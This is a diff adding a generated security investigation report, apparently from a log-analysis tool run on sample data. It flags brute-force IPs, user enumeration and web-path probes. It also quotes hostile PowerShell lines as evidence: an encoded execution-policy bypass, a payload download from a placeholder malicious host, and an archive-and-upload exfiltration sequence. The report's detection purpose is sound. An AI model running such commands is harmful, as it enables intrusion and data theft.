@@ -1,0 +1,159 @@
+---
+   SECURITY INVESTIGATION REPORT
+---
+Generated: 11/06/2026 20:08:05
+
+SUMMARY
+---
+Total suspicious events found: 132
+  - Auth threats:       109
+  - PowerShell threats: 9
+  - IOC matches:        14
+
+---
+SECTION 1: AUTHENTICATION THREATS
+---
+  [!] BRUTE FORCE: IP 181.26.186.35 had 30 failed login attempts
+  [!] BRUTE FORCE: IP 91.243.236.123 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 59.174.52.12 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 61.166.73.66 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 37.110.24.51 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 82.64.2.59 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 125.107.136.165 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 77.231.252.103 had 9 failed login attempts
+  [!] BRUTE FORCE: IP 222.89.76.13 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 183.93.215.158 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 123.119.111.172 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 78.106.21.86 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 119.193.140.203 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 46.89.129.145 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 190.107.182.33 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 191.81.42.216 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 119.193.140.176 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 49.4.143.105 had 120 failed login attempts
+  [!] BRUTE FORCE: IP 95.190.198.34 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 177.38.145.209 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 94.154.25.149 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 5.167.75.191 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 111.40.30.206 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 106.57.58.19 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.191.89.89 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 222.187.86.51 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.144.136.83 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 221.194.44.190 had 15 failed login attempts
+  [!] BRUTE FORCE: IP 122.189.193.214 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 123.164.142.82 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 186.130.83.53 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 61.183.117.250 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 46.30.160.83 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 105.101.221.33 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 58.100.135.31 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 85.245.107.41 had 11 failed login attempts
+  [!] BRUTE FORCE: IP 151.241.67.217 had 3 failed login attempts
+  [!] BRUTE FORCE: IP 73.231.4.205 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 49.4.143.5 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 181.25.201.155 had 12 failed login attempts
+  [!] BRUTE FORCE: IP 110.78.174.75 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 181.25.189.115 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 170.79.155.119 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 182.243.85.75 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 126.59.251.31 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 179.208.151.103 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 186.47.222.98 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 34.204.227.175 had 43 failed login attempts
+  [!] BRUTE FORCE: IP 181.211.173.182 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 219.82.145.223 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 186.128.141.232 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 103.230.120.26 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 58.19.144.50 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 182.243.87.6 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.112.235.133 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 37.78.105.176 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 112.251.168.248 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 218.91.34.237 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 178.219.248.139 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.163.61.218 had 30 failed login attempts
+  [!] BRUTE FORCE: IP 112.101.164.200 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.191.88.115 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 93.120.176.237 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 181.23.168.176 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 114.32.100.101 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 183.146.159.20 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 60.165.208.28 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.189.197.241 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.244.28.82 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 116.255.253.137 had 4 failed login attempts
+  [!] BRUTE FORCE: IP 175.162.187.121 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 201.27.216.125 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.5.240.60 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 179.38.76.250 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 201.178.81.113 had 36 failed login attempts
+  [!] BRUTE FORCE: IP 122.189.198.238 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 60.187.118.40 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 188.18.252.218 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 49.84.87.84 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 1.30.211.144 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 122.190.143.18 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 68.182.39.76 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 223.244.185.76 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 178.161.33.80 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 183.152.79.79 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 123.153.146.183 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 218.60.136.106 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 1.189.205.173 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 42.184.142.151 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 201.178.245.106 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 181.23.26.185 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 181.25.206.27 had 12 failed login attempts
+  [!] BRUTE FORCE: IP 14.54.210.101 had 12 failed login attempts
+  [!] BRUTE FORCE: IP 61.174.116.31 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 24.151.103.17 had 157 failed login attempts
+  [!] BRUTE FORCE: IP 183.93.253.159 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 123.120.200.51 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 111.40.166.130 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 49.4.143.181 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 123.96.5.168 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 222.186.56.220 had 9 failed login attempts
+  [!] BRUTE FORCE: IP 186.129.147.223 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 111.40.168.90 had 6 failed login attempts
+  [!] BRUTE FORCE: IP 191.83.152.32 had 6 failed login attempts
+  [!] USER ENUMERATION: 181.26.186.35 tried 3 accounts that do not exist - guest, monitor, test
+  [!] USER ENUMERATION: 91.197.232.109 tried 24 accounts that do not exist - 0, 0000, 010101, 1111, 1234, admin, api, dbadmin, default, ftp, ftpuser, git, gpadmin, guest, monitor, operator, osmc, pi, service, support, telecomadmin, test, ubnt, user
+  [!] SUSPICIOUS LOGIN: 85.245.107.41 logged in successfully after previous failures
+  [!] SUSPICIOUS LOGIN: 127.0.0.1 logged in successfully after previous failures
+  [!] SUSPICIOUS LOGIN: 24.151.103.17 logged in successfully after previous failures
+
+---
+SECTION 2: POWERSHELL THREATS
+---
+  [!] ENCODED COMMAND: 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+  [!] EXECUTION BYPASS: 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+  [!] NOPROFILE FLAG: 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+  [!] RECONNAISSANCE: 2025-02-01 10:03:01 whoami
+  [!] RECONNAISSANCE: 2025-02-01 10:03:10 ipconfig
+  [!] RECONNAISSANCE: 2025-02-01 10:03:44 net user
+  [!] SUSPICIOUS DOWNLOAD (HTTP): 2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe
+  [!] DATA COLLECTION: 2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\jdoe\Documents\data.zip
+  [!] POSSIBLE EXFILTRATION: Upload seen after archive creation - 2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+---
+SECTION 3: IOC MATCHES
+---
+  [!] MALICIOUS IP HIT: 203.0.113.5 found in access log - 203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+  [!] MALICIOUS PATH HIT: /admin found in access log - 203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 203.0.113.5 found in access log - 203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  [!] MALICIOUS PATH HIT: /phpmyadmin found in access log - 203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 203.0.113.5 found in access log - 203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  [!] MALICIOUS PATH HIT: /phpmyadmin found in access log - 203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 198.51.100.8 found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:51 -0700] "POST /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 198.51.100.8 found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  [!] MALICIOUS PATH HIT: /wp-admin found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 198.51.100.8 found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:53 -0700] "GET /wp-login.php HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 198.51.100.8 found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  [!] MALICIOUS PATH HIT: /wp-admin found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  [!] MALICIOUS IP HIT: 198.51.100.8 found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  [!] MALICIOUS PATH HIT: /wp-admin found in access log - 198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+
+---
+END OF REPORT
+---
